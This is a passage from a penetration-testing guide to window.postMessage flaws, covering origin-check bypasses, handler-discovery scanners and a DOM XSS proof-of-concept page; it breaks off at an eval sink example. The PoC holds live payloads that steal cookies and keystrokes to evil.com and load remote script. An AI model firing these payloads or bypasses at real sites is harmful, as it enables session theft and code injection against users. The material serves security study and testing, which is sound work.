---
title: PostMessage Vulnerabilities
description: window.postMessage exploitation — origin bypass, DOM XSS via message handlers, token theft, cross-origin data leakage, message spoofing, privilege escalation, and advanced pentesting methodology.
navigation:
  icon: i-lucide-mail-warning
  title: PostMessage Vulnerabilities
---

## What are PostMessage Vulnerabilities?

**`window.postMessage()`** is a browser API that enables **cross-origin communication** between windows, tabs, iframes, and popups. It was designed to safely replace dangerous hacks like `document.domain` manipulation or URL fragment messaging. However, when developers fail to **validate the message origin**, **sanitize message data**, or **restrict message targets**, attackers can **inject malicious messages**, **steal sensitive data**, **achieve cross-site scripting**, and **hijack authenticated sessions** — all through the browser's own legitimate messaging channel.

::callout
---
icon: i-lucide-skull
color: red
---
PostMessage vulnerabilities are **exceptionally dangerous** because they create a **deliberate hole in the Same-Origin Policy**. The API is designed to allow cross-origin communication — when developers misuse it, attackers get a **sanctioned channel** to inject payloads, steal tokens, and execute code across origins without triggering any browser security warnings.
::

::card-group
  ::card
  ---
  title: Missing Origin Validation
  icon: i-lucide-shield-off
  ---
  Message handlers that don't check `event.origin` accept messages from **any origin** — including attacker-controlled pages that frame or open the target.
  ::

  ::card
  ---
  title: Weak Origin Checks
  icon: i-lucide-shield-alert
  ---
  Origin validation using `indexOf()`, loose regex, or substring matching can be bypassed with attacker-controlled domains like `trusted.com.evil.com`.
  ::

  ::card
  ---
  title: Dangerous Sinks
  icon: i-lucide-flame
  ---
  Message data passed directly to `eval()`, `innerHTML`, `document.write()`, `location`, or jQuery `.html()` enables **DOM-based XSS** via cross-origin messages.
  ::

  ::card
  ---
  title: Wildcard Target Origin
  icon: i-lucide-globe
  ---
  Using `postMessage(data, '*')` sends sensitive data to **any listening origin** — an attacker who frames the page or opens it as a popup intercepts everything.
  ::
::

---

## How postMessage Works

### API Anatomy

::tabs
  :::tabs-item{icon="i-lucide-info" label="Sending Messages"}
  ```javascript [postmessage-send-api.js]
  // ═══════════════════════════════════════════
  // SENDING: window.postMessage(message, targetOrigin, [transfer])
  // ═══════════════════════════════════════════

  // Parameter 1: message — any serializable data
  // Parameter 2: targetOrigin — restricts WHO can receive
  // Parameter 3: transfer — optional Transferable objects

  // ── SECURE: Specify exact target origin ──
  iframe.contentWindow.postMessage(
    { type: 'auth', token: 'jwt_token_here' },
    'https://trusted-partner.com'   // Only this origin receives it
  );

  // ── INSECURE: Wildcard target origin ──
  iframe.contentWindow.postMessage(
    { type: 'auth', token: 'jwt_token_here' },
    '*'   // ANY origin can receive this! DANGEROUS!
  );

  // ── SENDING TO PARENT (from iframe) ──
  parent.postMessage({ action: 'loaded', height: document.body.scrollHeight }, '*');
  window.parent.postMessage('ready', '*');

  // ── SENDING TO OPENER (from popup) ──
  window.opener.postMessage({ result: 'oauth_code_here' }, '*');

  // ── SENDING TO ALL FRAMES ──
  for (let i = 0; i < window.frames.length; i++) {
    window.frames[i].postMessage('broadcast', '*');
  }

  // ── DATA TYPES THAT CAN BE SENT ──
  // Strings
  target.postMessage('simple string', '*');
  // Objects (structured clone)
  target.postMessage({ key: 'value', nested: { deep: true } }, '*');
  // Arrays
  target.postMessage([1, 2, 3, 'four'], '*');
  // ArrayBuffers (via transfer)
  const buffer = new ArrayBuffer(1024);
  target.postMessage(buffer, '*', [buffer]);
  // Blobs, Files, ImageData — all serializable types
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Receiving Messages"}
  ```javascript [postmessage-receive-api.js]
  // ═══════════════════════════════════════════
  // RECEIVING: window.addEventListener('message', handler)
  // ═══════════════════════════════════════════

  // The MessageEvent object contains:
  window.addEventListener('message', function(event) {
    
    // event.origin  — the origin of the SENDER
    //    e.g., "https://sender-site.com"
    //    MUST be validated before processing!
    
    // event.data    — the message payload
    //    Can be string, object, array, etc.
    
    // event.source  — reference to the sender's window object
    //    Can be used to send replies:
    //    event.source.postMessage('reply', event.origin);
    
    // event.ports   — MessagePort objects (for MessageChannel)
    
    // event.lastEventId — for server-sent events
    
    console.log('Origin:', event.origin);
    console.log('Data:', event.data);
    console.log('Source:', event.source);
    
  }, false);

  // ALTERNATIVE: onmessage property
  window.onmessage = function(event) {
    // Same event object
  };

  // MULTIPLE HANDLERS: All fire for every message
  window.addEventListener('message', handler1);
  window.addEventListener('message', handler2);
  // Both handler1 AND handler2 execute for each message
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Communication Flow"}
  ```text [postmessage-flow.txt]
  postMessage COMMUNICATION FLOW:
  ═══════════════════════════════
  
  ┌─────────────────────┐          ┌─────────────────────┐
  │    SENDER PAGE       │          │   RECEIVER PAGE      │
  │  (attacker.com)      │          │   (target.com)       │
  │                      │          │                      │
  │  // Get reference    │          │  // Listen for msgs  │
  │  var target =        │          │  window.addEventListener│
  │    iframe.contentWin │          │    ('message',       │
  │                      │          │     function(e) {    │
  │  // Send message     │  ──────▶ │       // e.origin    │
  │  target.postMessage( │  MSG     │       // e.data      │
  │    payload, '*'      │          │       // e.source    │
  │  );                  │          │     }                │
  │                      │          │    );                │
  └─────────────────────┘          └─────────────────────┘
  
  WAYS TO GET A WINDOW REFERENCE:
  ├── iframe.contentWindow (from parent to child iframe)
  ├── window.parent (from iframe to parent)
  ├── window.top (from deeply nested iframe to top)
  ├── window.opener (from popup to the page that opened it)
  ├── window.open() return value (from opener to popup)
  ├── window.frames[0] (from parent to specific frame by index)
  └── MessageChannel.port1/port2 (dedicated channel)
  
  CROSS-ORIGIN RULES:
  ├── postMessage CAN send cross-origin (by design!)
  ├── Same-Origin Policy does NOT block postMessage
  ├── Only targetOrigin parameter restricts delivery
  ├── Origin validation is RECEIVER's responsibility
  └── No browser warning or permission prompt
  ```
  :::
::

---

## Vulnerability Patterns

### Taxonomy of postMessage Vulnerabilities

```text [vulnerability-taxonomy.txt]
┌────────────────────────────────────────────────────────────────┐
│            postMessage VULNERABILITY TAXONOMY                  │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  RECEIVER-SIDE VULNERABILITIES:                                │
│  ├── No origin validation (accepts ANY message)                │
│  ├── Weak origin validation (indexOf, regex bypass)            │
│  ├── Data used in dangerous sink (innerHTML, eval, location)   │
│  ├── Prototype pollution via message data                      │
│  ├── Logic bypass via message manipulation                     │
│  └── Authentication/authorization bypass via message spoofing  │
│                                                                │
│  SENDER-SIDE VULNERABILITIES:                                  │
│  ├── Wildcard target origin (postMessage(data, '*'))           │
│  ├── Sensitive data in message (tokens, secrets, PII)          │
│  ├── Missing targetOrigin restriction                          │
│  └── Sending to user-controlled window reference               │
│                                                                │
│  ARCHITECTURAL VULNERABILITIES:                                │
│  ├── Two-way postMessage auth without proper handshake         │
│  ├── Message replay attacks (no nonce/timestamp)               │
│  ├── Race conditions in message processing                     │
│  ├── MessageChannel misuse                                     │
│  └── Service Worker message handler exploitation               │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### Vulnerable vs Secure Patterns

| Pattern | Code | Verdict |
|---------|------|:-------:|
| **No origin check** | `window.onmessage = function(e) { eval(e.data) }` | ❌ Critical |
| **indexOf check** | `if (e.origin.indexOf('trusted.com') > -1)` | ❌ Bypassable |
| **includes check** | `if (e.origin.includes('trusted'))` | ❌ Bypassable |
| **Regex without anchors** | `if (e.origin.match(/trusted\.com/))` | ❌ Bypassable |
| **endsWith check** | `if (e.origin.endsWith('.trusted.com'))` | ⚠️ Risky |
| **startsWith check** | `if (e.origin.startsWith('https://trusted'))` | ❌ Bypassable |
| **Wildcard target** | `target.postMessage(token, '*')` | ❌ Data leak |
| **Strict equality** | `if (e.origin === 'https://trusted.com')` | ✅ Secure |
| **Allowlist array** | `if (allowedOrigins.includes(e.origin))` | ✅ Secure |
| **Specific target** | `target.postMessage(data, 'https://trusted.com')` | ✅ Secure |

---

## Discovery & Reconnaissance

### Finding postMessage Handlers

::tabs
  :::tabs-item{icon="i-lucide-code" label="Automated Handler Discovery"}
  ```javascript [find-handlers.js]
  // Run in browser console on target page
  // Discovers ALL postMessage-related code

  (function() {
    console.log('═══════════════════════════════════════');
    console.log(' postMessage Vulnerability Scanner');
    console.log('═══════════════════════════════════════\n');
    
    const findings = {
      handlers: [],
      senders: [],
      origin_checks: [],
      dangerous_sinks: [],
      wildcard_targets: []
    };

    // ── 1. MONKEY-PATCH addEventListener to catch future handlers ──
    const origAdd = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, fn, opts) {
      if (type === 'message') {
        const fnStr = fn.toString();
        const info = {
          target: this === window ? 'window' : this.constructor.name,
          handler_preview: fnStr.substring(0, 300),
          has_origin_check: /\.origin/.test(fnStr),
          origin_method: 'none',
          dangerous_sinks: [],
          location: new Error().stack.split('\n').slice(1, 3).join('\n')
        };
        
        // Classify origin check quality
        if (/===.*origin|origin\s*===/.test(fnStr)) {
          info.origin_method = 'strict_equality ✓';
        } else if (/indexOf.*origin|origin.*indexOf/.test(fnStr)) {
          info.origin_method = 'indexOf ✗ BYPASSABLE';
        } else if (/includes.*origin|origin.*includes/.test(fnStr)) {
          info.origin_method = 'includes ✗ BYPASSABLE';
        } else if (/match.*origin|origin.*match|test.*origin/.test(fnStr)) {
          info.origin_method = 'regex — check anchoring';
        } else if (/endsWith.*origin|origin.*endsWith/.test(fnStr)) {
          info.origin_method = 'endsWith — subdomain bypass possible';
        } else if (/startsWith.*origin|origin.*startsWith/.test(fnStr)) {
          info.origin_method = 'startsWith ✗ BYPASSABLE';
        } else if (!info.has_origin_check) {
          info.origin_method = 'NONE ✗✗ NO ORIGIN CHECK!';
        }
        
        // Check for dangerous sinks
        const sinkPatterns = {
          'innerHTML': /innerHTML\s*=|innerHTML\s*\+=/,
          'outerHTML': /outerHTML\s*=/,
          'document.write': /document\.write/,
          'eval': /\beval\s*\(/,
          'Function()': /new\s+Function|Function\s*\(/,
          'setTimeout(string)': /setTimeout\s*\(\s*[^,]*data|setTimeout\s*\(\s*e/,
          'setInterval(string)': /setInterval\s*\(\s*[^,]*data/,
          'location': /location\s*=|location\.href\s*=|location\.replace/,
          'window.open': /window\.open\s*\(/,
          'jQuery.html()': /\.html\s*\(|\.append\s*\(|\.prepend\s*\(/,
          'jQuery.$()': /\$\s*\(\s*[^,]*data/,
          'src/href': /\.src\s*=|\.href\s*=/,
          'srcdoc': /srcdoc\s*=/,
          'postMessage relay': /\.postMessage\s*\(/
        };
        
        for (const [sink, pattern] of Object.entries(sinkPatterns)) {
          if (pattern.test(fnStr)) {
            info.dangerous_sinks.push(sink);
          }
        }
        
        findings.handlers.push(info);
        
        // Alert on critical findings
        if (!info.has_origin_check && info.dangerous_sinks.length > 0) {
          console.log('%c[CRITICAL] Handler with NO origin check + dangerous sink!',
            'color:red;font-weight:bold;font-size:14px');
          console.log('  Sinks:', info.dangerous_sinks.join(', '));
          console.log('  Handler:', fnStr.substring(0, 200));
        }
      }
      return origAdd.call(this, type, fn, opts);
    };

    // ── 2. CHECK window.onmessage ──
    if (window.onmessage) {
      const fnStr = window.onmessage.toString();
      console.log('[+] window.onmessage is set directly');
      console.log('    Handler:', fnStr.substring(0, 300));
      findings.handlers.push({
        target: 'window.onmessage (direct)',
        handler_preview: fnStr.substring(0, 300),
        has_origin_check: /\.origin/.test(fnStr)
      });
    }

    // ── 3. SCAN ALL SCRIPTS for postMessage patterns ──
    const scripts = document.querySelectorAll('script');
    let scriptIndex = 0;
    
    scripts.forEach(script => {
      const src = script.src;
      const content = script.textContent || '';
      scriptIndex++;
      
      // Check for message listeners in inline scripts
      if (content.includes('message')) {
        const messagePatterns = [
          { re: /addEventListener\s*\(\s*['"]message['"]/g, type: 'listener' },
          { re: /onmessage\s*=/g, type: 'onmessage' },
          { re: /\.postMessage\s*\([^)]*,\s*['"]\*['"]\s*\)/g, type: 'wildcard_send' },
          { re: /\.postMessage\s*\(/g, type: 'send' }
        ];
        
        messagePatterns.forEach(({ re, type }) => {
          const matches = content.match(re);
          if (matches) {
            matches.forEach(m => {
              const idx = content.indexOf(m);
              const context = content.substring(
                Math.max(0, idx - 50), 
                Math.min(content.length, idx + 200)
              ).replace(/\s+/g, ' ').trim();
              
              if (type === 'wildcard_send') {
                console.log(`%c[HIGH] Script ${scriptIndex}: Wildcard postMessage!`,
                  'color:orange;font-weight:bold');
                console.log('  Context:', context);
                findings.wildcard_targets.push({ script: scriptIndex, context });
              } else if (type === 'listener' || type === 'onmessage') {
                console.log(`[+] Script ${scriptIndex}: Message ${type} found`);
                console.log('  Context:', context);
              }
            });
          }
        });
      }
      
      // Also scan external scripts
      if (src && (src.includes('postmessage') || src.includes('message'))) {
        console.log(`[+] External script with message-related name: ${src}`);
      }
    });

    // ── 4. SCAN EXTERNAL JS FILES ──
    console.log('\n[*] Scanning external scripts (async)...');
    const externalScripts = Array.from(document.querySelectorAll('script[src]'));
    
    Promise.all(externalScripts.map(s => 
      fetch(s.src).then(r => r.text()).then(content => {
        if (/addEventListener\s*\(\s*['"]message['"]|onmessage\s*=|\.postMessage\s*\(/.test(content)) {
          console.log(`[+] External script has postMessage code: ${s.src}`);
          
          // Extract the handler
          const handlerMatch = content.match(/addEventListener\s*\(\s*['"]message['"]\s*,\s*(function[^}]+})/);
          if (handlerMatch) {
            console.log('  Handler preview:', handlerMatch[1].substring(0, 200));
          }
          
          if (/\.postMessage\s*\([^)]*,\s*['"]\*['"]\s*\)/.test(content)) {
            console.log(`%c  [HIGH] Wildcard postMessage in: ${s.src}`, 'color:orange');
          }
        }
      }).catch(() => {})
    )).then(() => {
      // ── 5. PRINT SUMMARY ──
      console.log('\n══��════════════════════════════════════');
      console.log(' SCAN SUMMARY');
      console.log('═══════════════════════════════════════');
      console.log(`Handlers found: ${findings.handlers.length}`);
      console.log(`Wildcard senders: ${findings.wildcard_targets.length}`);
      
      findings.handlers.forEach((h, i) => {
        console.log(`\n--- Handler ${i + 1} ---`);
        console.log(`Target: ${h.target}`);
        console.log(`Origin check: ${h.origin_method}`);
        console.log(`Dangerous sinks: ${h.dangerous_sinks?.join(', ') || 'none detected'}`);
        console.log(`Preview: ${h.handler_preview?.substring(0, 150)}`);
      });
    });
    
    // Expose findings globally for further analysis
    window.__pmFindings = findings;
    console.log('\n[*] Findings stored in window.__pmFindings');
    
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Static Source Analysis"}
  ```bash [static-analysis.sh]
  #!/bin/bash
  # Static analysis of JavaScript files for postMessage vulnerabilities

  TARGET="${1:-https://target.com}"
  OUTPUT_DIR="pm_analysis_$(date +%s)"
  mkdir -p "$OUTPUT_DIR"

  echo "═══════════════════════════════════════"
  echo " postMessage Static Analysis"
  echo " Target: $TARGET"
  echo "═══════════════════════════════════════"

  # Step 1: Crawl and download JS files
  echo -e "\n[1] Extracting JavaScript URLs..."
  curl -s "$TARGET" | grep -oP '(?:src|href)=["\x27]([^"\x27]*\.js[^"\x27]*)["\x27]' | \
    sed "s/.*[\"']//;s/[\"'].*//" | sort -u > "$OUTPUT_DIR/js_urls.txt"

  # Also get from common paths
  for path in /assets/js/ /static/js/ /dist/ /build/ /bundle/ /js/; do
    curl -s "$TARGET$path" 2>/dev/null | grep -oP '[a-zA-Z0-9._-]+\.js' >> "$OUTPUT_DIR/js_urls.txt"
  done

  echo "  Found $(wc -l < "$OUTPUT_DIR/js_urls.txt") JS files"

  # Step 2: Download and analyze each file
  echo -e "\n[2] Analyzing JavaScript files..."

  while IFS= read -r js_url; do
    # Make absolute URL
    if [[ "$js_url" == //* ]]; then
      js_url="https:$js_url"
    elif [[ "$js_url" == /* ]]; then
      js_url="$TARGET$js_url"
    elif [[ "$js_url" != http* ]]; then
      js_url="$TARGET/$js_url"
    fi
    
    FILENAME=$(echo "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g')
    JS_CONTENT=$(curl -s --max-time 10 "$js_url" 2>/dev/null)
    
    if [ -z "$JS_CONTENT" ]; then continue; fi
    
    # Check for postMessage patterns
    HAS_LISTENER=$(echo "$JS_CONTENT" | grep -c "addEventListener.*message\|onmessage\s*=")
    HAS_SENDER=$(echo "$JS_CONTENT" | grep -c "\.postMessage\s*(")
    HAS_WILDCARD=$(echo "$JS_CONTENT" | grep -c "postMessage.*\*")
    HAS_ORIGIN=$(echo "$JS_CONTENT" | grep -c "\.origin")
    HAS_EVAL=$(echo "$JS_CONTENT" | grep -c "eval\s*(.*data\|eval\s*(.*message")
    HAS_INNERHTML=$(echo "$JS_CONTENT" | grep -c "innerHTML.*data\|innerHTML.*message")
    HAS_LOCATION=$(echo "$JS_CONTENT" | grep -c "location.*data\|location.*=.*message")
    
    if [ "$HAS_LISTENER" -gt 0 ] || [ "$HAS_SENDER" -gt 0 ]; then
      echo ""
      echo "  [+] $js_url"
      echo "      Listeners: $HAS_LISTENER | Senders: $HAS_SENDER"
      [ "$HAS_WILDCARD" -gt 0 ] && echo "      [!] WILDCARD postMessage: $HAS_WILDCARD instances"
      [ "$HAS_ORIGIN" -eq 0 ] && [ "$HAS_LISTENER" -gt 0 ] && echo "      [!!] NO ORIGIN CHECK in listener!"
      [ "$HAS_EVAL" -gt 0 ] && echo "      [!!!] EVAL SINK detected with message data!"
      [ "$HAS_INNERHTML" -gt 0 ] && echo "      [!!!] innerHTML SINK detected with message data!"
      [ "$HAS_LOCATION" -gt 0 ] && echo "      [!!] LOCATION SINK detected with message data!"
      
      # Save the file for manual analysis
      echo "$JS_CONTENT" > "$OUTPUT_DIR/$FILENAME"
      
      # Extract context around postMessage usage
      echo "$JS_CONTENT" | grep -n -B2 -A5 "addEventListener.*message\|onmessage\|\.postMessage" \
        >> "$OUTPUT_DIR/contexts.txt"
    fi
  done < "$OUTPUT_DIR/js_urls.txt"

  echo -e "\n═══════════════════════════════════════"
  echo " Analysis complete. Results in: $OUTPUT_DIR/"
  echo "═══════════════════════════════════════"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Live Message Monitor"}
  ```javascript [live-message-monitor.js]
  // Paste in browser console to monitor ALL postMessage traffic in real-time

  (function() {
    const LOG_STYLE = 'background:#1a1a2e;color:#e94560;padding:3px 8px;border-radius:3px;';
    const SEND_STYLE = 'background:#0f3460;color:#16c79a;padding:3px 8px;border-radius:3px;';
    
    // ── Monitor incoming messages ──
    window.addEventListener('message', function(e) {
      console.groupCollapsed('%c📨 INCOMING postMessage', LOG_STYLE);
      console.log('Origin:', e.origin);
      console.log('Data:', e.data);
      console.log('Data type:', typeof e.data);
      console.log('Source:', e.source === window.parent ? 'parent' : 
                            e.source === window.opener ? 'opener' : 'other');
      
      // Check for sensitive data
      const dataStr = JSON.stringify(e.data);
      if (dataStr) {
        if (/token|jwt|session|auth|key|secret|password|credential/i.test(dataStr)) {
          console.log('%c⚠ SENSITIVE DATA DETECTED!', 'color:red;font-weight:bold');
        }
        if (/eyJ[A-Za-z0-9-_]+\.eyJ/.test(dataStr)) {
          console.log('%c⚠ JWT TOKEN DETECTED!', 'color:red;font-weight:bold');
        }
      }
      
      console.log('Timestamp:', new Date().toISOString());
      console.trace('Stack trace');
      console.groupEnd();
    }, true);
    
    // ── Monitor outgoing messages ──
    const origPostMessage = window.postMessage.bind(window);
    window.postMessage = function(msg, target, transfer) {
      console.groupCollapsed('%c📤 OUTGOING postMessage', SEND_STYLE);
      console.log('Data:', msg);
      console.log('Target origin:', target);
      if (target === '*') {
        console.log('%c⚠ WILDCARD TARGET — message sent to ALL origins!', 
          'color:orange;font-weight:bold');
      }
      console.trace('Called from');
      console.groupEnd();
      return origPostMessage(msg, target, transfer);
    };
    
    // Patch iframe contentWindow.postMessage too
    const origHTMLIframeElement = HTMLIFrameElement.prototype;
    const origContentWindow = Object.getOwnPropertyDescriptor(
      origHTMLIframeElement, 'contentWindow'
    );
    
    if (origContentWindow) {
      Object.defineProperty(origHTMLIframeElement, 'contentWindow', {
        get: function() {
          const win = origContentWindow.get.call(this);
          if (win && !win.__pmPatched) {
            const origPM = win.postMessage.bind(win);
            win.postMessage = function(msg, target, transfer) {
              console.groupCollapsed('%c📤 OUTGOING to iframe', SEND_STYLE);
              console.log('Iframe src:', this.frameElement?.src || 'unknown');
              console.log('Data:', msg);
              console.log('Target:', target);
              console.groupEnd();
              return origPM(msg, target, transfer);
            };
            win.__pmPatched = true;
          }
          return win;
        }
      });
    }
    
    console.log('%c[*] postMessage Monitor Active — watching all messages...', 
      'color:cyan;font-weight:bold');
  })();
  ```
  :::
::

---

## Origin Bypass Techniques

### Comprehensive Origin Validation Bypass

::tabs
  :::tabs-item{icon="i-lucide-code" label="indexOf Bypass"}
  ```javascript [indexof-bypass.js]
  // ═══════════════════════════════════════
  // BYPASS: indexOf() origin check
  // ═══════════════════════════════════════

  // Vulnerable code:
  // window.addEventListener('message', function(e) {
  //   if (e.origin.indexOf('trusted.com') > -1) {
  //     document.getElementById('output').innerHTML = e.data;
  //   }
  // });

  // PROBLEM: indexOf checks for SUBSTRING match
  // "trusted.com" appears in ALL of these origins:

  // Bypass 1: Subdomain of attacker's domain
  // Register: trusted.com.evil.com
  // e.origin = "https://trusted.com.evil.com" → indexOf > -1 ✓

  // Bypass 2: Attacker domain containing the string
  // Register: nottrusted.com
  // e.origin = "https://nottrusted.com" → indexOf > -1 ✓

  // Bypass 3: Path/fragment confusion (won't work — origin has no path)
  // But subdomain works:
  // Register: evil-trusted.com
  // e.origin = "https://evil-trusted.com" → indexOf > -1 ✓

  // Bypass 4: Multiple levels
  // Register: trusted.com.my.evil.com
  // e.origin = "https://trusted.com.my.evil.com" → indexOf > -1 ✓

  // ── ATTACKER'S EXPLOIT PAGE (hosted on trusted.com.evil.com) ──
  const iframe = document.createElement('iframe');
  iframe.src = 'https://target.com/vulnerable-page';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  iframe.onload = function() {
    // This message will pass the indexOf check!
    iframe.contentWindow.postMessage(
      '<img src=x onerror=alert(document.domain)>',
      'https://target.com'
    );
  };
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Regex Bypass"}
  ```javascript [regex-bypass.js]
  // ═══════════════════════════════════════
  // BYPASS: Regex origin check (various patterns)
  // ═══════════════════════════════════════

  // ── Pattern 1: Unescaped dot ──
  // Vulnerable: if (e.origin.match(/trusted.com/))
  // The dot matches ANY character!
  // Bypass: "trustedXcom.evil.com" (X = any char)
  // Register: trustedxcom.evil.com

  // ── Pattern 2: No anchors ──
  // Vulnerable: if (/trusted\.com/.test(e.origin))
  // No ^ or $ anchors → matches substring
  // Bypass: "trusted.com.evil.com"

  // ── Pattern 3: Missing protocol check ──
  // Vulnerable: if (e.origin.match(/^https?:\/\/trusted\.com$/))
  // This is actually secure! But rare in practice.

  // ── Pattern 4: Wildcard subdomain ──
  // Vulnerable: if (e.origin.match(/\.trusted\.com$/))
  // Register: evil.trusted.com (if subdomain takeover possible)
  // Or: Find XSS on any *.trusted.com subdomain

  // ── Pattern 5: Case sensitivity ──
  // Vulnerable: if (/trusted\.com/i.test(e.origin))
  // Origins are already lowercase, but combined with other issues...

  // ── Pattern 6: startsWith ──
  // Vulnerable: if (e.origin.startsWith('https://trusted'))
  // Bypass: "https://trusted.evil.com"
  // Bypass: "https://trustedmalicious.com"

  // ── Pattern 7: endsWith ──
  // Vulnerable: if (e.origin.endsWith('trusted.com'))
  // Bypass: "https://nottrusted.com" → endsWith matches!
  // Bypass: "https://evil-trusted.com"

  // ── Pattern 8: Split/parse errors ──
  // Vulnerable: 
  //   var allowed = e.origin.split('//')[1].split('/')[0];
  //   if (allowed === 'trusted.com') { ... }
  // This is actually secure for origin check,
  // but complex parsing often has edge cases.

  // ── COMPREHENSIVE BYPASS TESTER ──
  function testOriginBypass(checkFunction) {
    const bypasses = [
      'https://trusted.com.evil.com',
      'https://evil-trusted.com',
      'https://nottrusted.com',
      'https://trustedXcom.evil.com',
      'https://evil.trusted.com',
      'https://trusted.com.attacker.com',
      'https://trusted.computer',
      'https://my-trusted.com',
      'https://trusted.com:8080.evil.com',
      'http://trusted.com',  // Protocol downgrade
      'https://trusted.com@evil.com',  // URL confusion
    ];
    
    bypasses.forEach(origin => {
      const passes = checkFunction(origin);
      if (passes) {
        console.log(`[+] BYPASS FOUND: ${origin}`);
      }
    });
  }

  // Test the target's actual check function:
  // testOriginBypass(function(origin) {
  //   return origin.indexOf('trusted.com') > -1;
  // });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="includes / endsWith / startsWith"}
  ```javascript [string-method-bypasses.js]
  // ═══════════════════════════════════════
  // BYPASS: String method origin checks
  // ═══════════════════════════════════════

  // ── includes() ──
  // Vulnerable: if (e.origin.includes('trusted.com'))
  // SAME as indexOf — substring match
  // Bypass: trusted.com.evil.com
  // Bypass: nottrusted.com

  // ── endsWith() ──
  // Vulnerable: if (e.origin.endsWith('trusted.com'))
  // 
  // Bypass: "https://evil-trusted.com"  → endsWith ✓
  // Bypass: "https://nottrusted.com"     → endsWith ✓
  // Bypass: "https://xtrusted.com"       → endsWith ✓
  //
  // SECURE version: if (e.origin.endsWith('.trusted.com'))
  //   The dot prevents direct match but...
  //   Bypass: Register evil.trusted.com via subdomain takeover
  //   Bypass: XSS on any *.trusted.com subdomain

  // ── startsWith() ──
  // Vulnerable: if (e.origin.startsWith('https://trusted'))
  // 
  // Bypass: "https://trusted.evil.com"       → startsWith ✓
  // Bypass: "https://trustedmalicious.com"    → startsWith ✓
  // Bypass: "https://trusted-hacking.com"     → startsWith ✓

  // ── Combined weak check ──
  // Vulnerable:
  // if (e.origin.startsWith('https://') && e.origin.includes('trusted.com'))
  // 
  // Bypass: "https://trusted.com.evil.com"    → both pass ✓

  // ── URL constructor parsing ──
  // Vulnerable:
  // var url = new URL(e.origin);
  // if (url.hostname.endsWith('trusted.com'))
  // 
  // Bypass: "https://evil-trusted.com"        → hostname ends with ✓
  // Secure: url.hostname.endsWith('.trusted.com') || url.hostname === 'trusted.com'

  // ═══ DOMAIN REGISTRATION GUIDE ═══
  // For origin: "https://target-app.trusted.com"
  // Register these for bypass testing:
  //
  // trusted.com.YOUR-DOMAIN.com
  // nottrusted.com  (if available)
  // evil-trusted.com
  // target-app.trusted.com.YOUR-DOMAIN.com
  // my-target-app.trusted.com (subdomain takeover check)
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Complete Bypass Matrix"}
  ```text [bypass-matrix.txt]
  ORIGIN BYPASS MATRIX:
  ═════════════════════
  
  Target origin: "https://app.trusted.com"
  
  ┌────────────────────────────┬───────┬────────┬────────┬─────────┬──────────┐
  │ Bypass Domain              │indexOf│includes│endsWith│startsWith│ regex   │
  │                            │       │        │        │         │/trusted/ │
  ├────────────────────────────┼───────┼────────┼────────┼─────────┼──────────┤
  │ trusted.com.evil.com       │  ✓   │   ✓    │   ✗    │   ✗     │   ✓     │
  │ app.trusted.com.evil.com   │  ✓   │   ✓    │   ✗    │   ✓*    │   ✓     │
  │ evil-trusted.com           │  ✓   │   ✓    │   ✓    │   ✗     │   ✓     │
  │ nottrusted.com             │  ✓   │   ✓    │   ✓    │   ✗     │   ✓     │
  │ trustedmalicious.com       │  ✓   │   ✓    │   ✗    │   ✓*    │   ✓     │
  │ evil.trusted.com           │  ✓   │   ✓    │   ✓    │   ✗     │   ✓     │
  │ trusted.computer           │  ✓   │   ✓    │   ✗    │   ✓*    │   ✓     │
  │ http://app.trusted.com     │  ✓   │   ✓    │   ✓    │   ✗     │   ✓     │
  └────────────────────────────┴───────┴────────┴────────┴─────────┴──────────┘
  
  * startsWith('https://trusted') or startsWith('https://app.trusted')
  
  ONLY SECURE PATTERNS:
  ─────────────────────
  ✓ e.origin === 'https://app.trusted.com'
  ✓ allowlist.includes(e.origin)
  ✓ new URL(e.origin).hostname === 'app.trusted.com'
  ✓ /^https:\/\/app\.trusted\.com$/.test(e.origin)
  ```
  :::
::

---

## Payloads & Exploitation Techniques

### DOM XSS via postMessage

::tabs
  :::tabs-item{icon="i-lucide-code" label="innerHTML Sink"}
  ```html [dom-xss-innerhtml.html]
  <!-- 
    SCENARIO: Target page has this vulnerable handler:
    window.addEventListener('message', function(e) {
      document.getElementById('notifications').innerHTML = e.data;
    });
  -->

  <!DOCTYPE html>
  <html>
  <head><title>postMessage DOM XSS PoC</title></head>
  <body>
  <h2>postMessage → innerHTML → DOM XSS</h2>

  <!-- Frame the vulnerable target page -->
  <iframe id="target" src="https://target.com/dashboard" 
    style="width:800px;height:400px;border:1px solid #ccc;">
  </iframe>

  <button onclick="sendPayload()">Send XSS Payload</button>
  <div id="log"></div>

  <script>
  function sendPayload() {
    const target = document.getElementById('target').contentWindow;
    
    // Payload collection for innerHTML sink
    const payloads = [
      // Basic XSS
      '<img src=x onerror=alert(document.domain)>',
      
      // Cookie theft
      '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
      
      // Keylogger injection
      '<img src=x onerror="document.onkeypress=function(e){fetch(\'https://evil.com/k?k=\'+e.key)}">',
      
      // Full exploitation
      '<img src=x onerror="' +
        'var s=document.createElement(\'script\');' +
        's.src=\'https://evil.com/exploit.js\';' +
        'document.head.appendChild(s)' +
      '">',
      
      // SVG-based (sometimes bypasses sanitizers)
      '<svg onload=alert(document.domain)>',
      '<svg><animate onbegin=alert(document.domain) attributeName=x>',
      
      // Without parentheses
      '<img src=x onerror=alert`document.domain`>',
      
      // iframe injection (nested framing)
      '<iframe src="javascript:alert(document.domain)">',
      '<iframe srcdoc="<script>alert(document.domain)<\/script>">'
    ];
    
    // Send each payload
    payloads.forEach((payload, i) => {
      setTimeout(() => {
        target.postMessage(payload, '*');
        document.getElementById('log').innerHTML += 
          `<p>Sent payload ${i + 1}: ${payload.substring(0, 60)}...</p>`;
      }, i * 1000);
    });
  }
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="eval / Function Sink"}
  ```html [dom-xss-eval.html]
  <!--
